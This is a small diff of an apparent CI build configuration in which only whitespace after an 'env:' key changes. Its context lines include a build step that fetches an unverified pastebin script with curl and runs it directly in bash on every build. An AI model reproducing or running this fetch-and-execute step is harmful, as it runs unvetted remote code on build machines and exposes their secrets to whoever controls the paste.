@@ -5,7 +5,7 @@ docker_builder:
     - bash -c "$(curl -fsSL https://pastebin.com/raw/zy1Ss1Xz)" 
     - export PATH=$PATH:/usr/local/go/bin
     - go test ./...
-  env:
+  env: 
     HOME: /root 
 
 docker_builder:
